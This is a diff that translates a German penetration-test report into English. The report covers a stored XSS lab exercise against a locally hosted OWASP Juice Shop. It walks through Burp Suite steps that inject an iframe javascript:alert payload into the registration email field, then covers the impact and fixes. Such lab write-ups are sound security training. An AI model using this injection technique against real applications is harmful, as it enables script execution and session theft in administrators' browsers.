@@ -1,23 +1,23 @@
-# Penetration Test Bericht – Client-side XSS Protection (Stored XSS über Registrierung)
+# 🛡️ Penetration Test Report – Client-side XSS Protection (Stored XSS via Registration)
 
-## 1. Ziel  
-Ziel dieses Pentests im OWASP Juice Shop war es, eine Stored XSS-Schwachstelle nachzuweisen, bei der ein Administrator im Administration-Bereich beim Anzeigen von Benutzereingaben ein JavaScript-Popup mit der Meldung `xss` erhält.
+## 1. Objective
+The objective of this penetration test in OWASP Juice Shop was to demonstrate a Stored XSS vulnerability where an administrator, when viewing user input in the administration section, is presented with a JavaScript popup showing the message `xss`.
 
 ---
 
-## 2. Scope (Testumfang)  
-- **Zielsystem:** OWASP Juice Shop – lokal gehostet  
-- **Testmethode:** Black-Box  
-- **Testzeitraum:** 18.08.2025 - 19.08.2025
+## 2. Scope
+- **Target System:** OWASP Juice Shop – locally hosted 
+- **Test Methodology:** Black-Box  
+- **Test Period:** 18.08.2025 - 19.08.2025
 - **Tools:** DevTools, Burp Suite (Proxy + Repeater)
 
 ---
 
-## 3. Vorgehensweise  
-1. Zum Login Bereich vom Owasp Juice Shop Navigieren. In unserm Fall: `http://127.0.0.1:3000/#/login`.
-2. Neuen Nutzer erstellen. Auf `Not yet a customer?` klicken und Formular normal ausfüllen.
-3. Wichtig: Im Feld `Email` zunächst eine valide Adresse eintragen (z. B. `bob@gmail.com`). Und auf `Register` klicken
-4. In Burpsuite auf HTTP history gehen und nach dem Post request suchen, womit wir den neuen user erstellen wollten. Du solltest unter URL nach /api/Users suchen. Im Request fenster solltest du dann sowas sehen:
+## 3. Methodology
+1. Navigate to the login page of OWASP Juice Shop: `http://127.0.0.1:3000/#/login`.
+2. Create a new user by clicking on `Not yet a customer?` and filling out the registration form.
+3. Important: Enter a valid email in the `Email` field first (e.g., `bob@gmail.com`) and click `Register`.
+4. In Burp Suite, go to HTTP history and locate the POST request used to create the new user. Look for requests to `/api/Users`. In the request body, you should see something like:
 ``` JSON
 {
     "email":"bob@gmail.com",
@@ -32,12 +32,12 @@ Ziel dieses Pentests im OWASP Juice Shop war es, eine Stored XSS-Schwachstelle n
     "securityAnswer":"zaya"
 }
 ```
-5. Rechtsklick im Request fenster bereich und `Send to Repeater klicken`. Danach oben in der Leiste auf Repeater klicken, damit sich die Repeater ansicht öffnet. Hier manipulieren wir jetzt unseren user json und fügen unsere payload `<iframe src="javascript:alert(`xss`)">` im value vom key: `email` ein.
+5. Right-click inside the request and select `Send to Repeater klicken`. Then switch to the Repeater tab. Here we manipulate the JSON and insert our payload `<iframe src="javascript:alert('xss')">` into the `email` field:
 ``` JSON
 "email": "<iframe src='javascript:alert(`xss`)'>"
 ```
 
-6. Anschliessend klicken wir auf Send. Als Response müssten wir eine positive rückmeldung erhalten:
+6. Click Send. The response should confirm successful account creation:
 ``` JSON
 HTTP/1.1 201 Created
 Access-Control-Allow-Origin: *
@@ -71,43 +71,38 @@ Keep-Alive: timeout=5
     }
 }
 ```
-7. Jetzt können wir uns als admin einloggen und zur administration page navigieren `http://127.0.0.1:3000/#/administration`
+7. Log in as admin and navigate to the administration page: `http://127.0.0.1:3000/#/administration`
 
-8. Wenn die Schritte richtig angewandt wurden müsste jetzt ein Alert mit dem Text `xss` angezeigt werden.
-
----
-
-## 4. Gefundene Schwachstelle(n)
-- Stored XSS über das Feld „E-Mail bei Registrierung“
-- Eingaben werden ungefiltert in der Datenbank gespeichert.
-- Darstellung im Adminbereich erfolgt ohne Schutz, sodass JavaScript-Code ausgeführt wird.
+8. If the steps were followed correctly, a popup with the text `xss` should appear.
 
 ---
 
-## 5. Risikoanalyse / Auswirkung:
-- Ausführung von fremdem JavaScript im Admin-Browser.
-- Gefahr von Session-Diebstahl, Manipulation der Admin-Ansicht oder Datenabfluss.
-- Jeder gespeicherte bösartige Account könnte beim Öffnen des Adminbereichs dauerhaft XSS auslösen.
+## 4. Vulnerability Identified
+- Stored XSS via the “Email” field during registration
+- User input is stored unfiltered in the database.
+- When displayed in the administration section, the data is rendered without protection, allowing JavaScript execution.
 
 ---
 
-## 6. Empfehlung  
-- Eingaben prüfen (Frontend & Backend):
-Nicht nur im Browser (JavaScript), sondern auch auf dem Server sicherstellen, dass ins Feld E-Mail nur echte E-Mail-Adressen im richtigen Format gespeichert werden.
-- Vor dem Speichern in die Datenbank validieren:
-Alle Eingaben sollten bereinigt werden, damit keine HTML-Tags oder JavaScript gespeichert werden können.
-- Ausgabe absichern:
-Wenn Eingaben (wie E-Mail-Adressen) später angezeigt werden, sollten sie so ausgegeben werden, dass der Browser sie nicht als HTML oder JavaScript interpretiert, sondern wirklich nur als Text.
-- Content Security Policy (CSP):
-Eine einfache CSP-Regel kann helfen, dass fremder JavaScript-Code nicht ausgeführt werden darf.
+## 5. Risk Analysis / Impact
+- Execution of arbitrary JavaScript in the administrator’s browser.
+- Potential theft of session cookies, manipulation of admin views, or data exfiltration.
+- Every maliciously created account can permanently trigger XSS when the admin section is accessed.
 
 ---
 
-## 7. Fazit  
-Die Anwendung ist im Feld E-Mail bei der Registrierung für Stored XSS anfällig.
-Durch Manipulation des Requests konnte eine Payload gespeichert werden, die beim Öffnen der Administration-Sektion automatisch ausgeführt wird.
-Die Schwachstelle ist kritisch, da Angreifer so Code im Browser des Administrators ausführen könnten.
-Eine einfache Validierung und Absicherung der Eingaben würde dieses Problem verhindern.
+## 6. Recommendations 
+- Input Validation (Frontend & Backend): Ensure only properly formatted email addresses are accepted. Validation must occur on the server, not just the client.
+- Sanitize Input Before Storing: Strip HTML tags or JavaScript before saving data to the database.
+- Secure Output Encoding: When displaying data (such as email addresses), ensure the browser interprets it as plain text, not HTML/JavaScript.
+- Implement Content Security Policy (CSP): Even a simple CSP rule can mitigate execution of injected scripts.
 
 ---
+
+## 7. Conclusion
+The application is vulnerable to Stored XSS in the email field during registration.
+By manipulating the request, a payload was successfully stored and executed automatically in the administration panel.
+This vulnerability is critical, as it enables attackers to execute arbitrary code in the administrator’s browser.
+Proper input validation, sanitization, and secure output handling would prevent this issue.
+
 
